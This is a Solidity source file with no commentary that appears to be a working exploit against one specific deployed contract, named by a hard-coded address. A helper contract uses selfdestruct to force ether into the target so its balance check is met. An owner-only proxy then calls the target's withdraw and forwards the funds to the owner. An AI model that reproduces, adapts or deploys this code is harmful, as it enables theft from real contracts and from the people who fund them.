pragma solidity ^0.5.0;

contract Pass {
    constructor(address payable targetAddress) public payable {
        selfdestruct(targetAddress);
    }
}

interface TargetInterface {
    function checkBalance() external view returns (uint256);
    function withdraw() external returns (bool);
    function stock() external view returns (uint256);
    function withdrawStock() external;
}

contract Proxy_toff {
    
    address payable private constant targetAddress = 0x5799D73e4C60203CA6C7dDCB083b0c74ACb4b4C3;
    address payable private owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() public payable {
        owner = msg.sender;
    }
    
    function investTargetMsgValue(bool keepBalance, bool leaveStock) public payable {
        investTargetAmount(msg.value, keepBalance, leaveStock);
    }

    function investTargetAmount(uint256 amount, bool keepBalance, bool leaveStock) public payable onlyOwner {
        (bool success,) = targetAddress.call.value(amount)("");
        require(success);
        
        if (!leaveStock) {
            TargetInterface target = TargetInterface(targetAddress);
            target.withdrawStock();
        }

        if (!keepBalance) {
            owner.transfer(address(this).balance);
        }
    }

    function withdrawTarget(bool keepBalance) public payable onlyOwner {
        TargetInterface target = TargetInterface(targetAddress);
        uint256 targetStock = target.stock();
        uint256 targetBalanceAvailable = targetAddress.balance - targetStock;
        uint256 targetBalanceRequired = target.checkBalance();
        
        if (targetStock == 0) {
            targetBalanceRequired++;
        }

        if (targetBalanceRequired > targetBalanceAvailable) {
            uint256 needAdd = targetBalanceRequired - targetBalanceAvailable;
            
            require(address(this).balance >= needAdd);
            (new Pass).value(needAdd)(targetAddress);
        }

        target.withdraw();
        
        if (!keepBalance) {
            owner.transfer(address(this).balance);
        }
    }
    
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    function kill() public onlyOwner {
        selfdestruct(owner);
    }

    function () external payable {
    }
    
}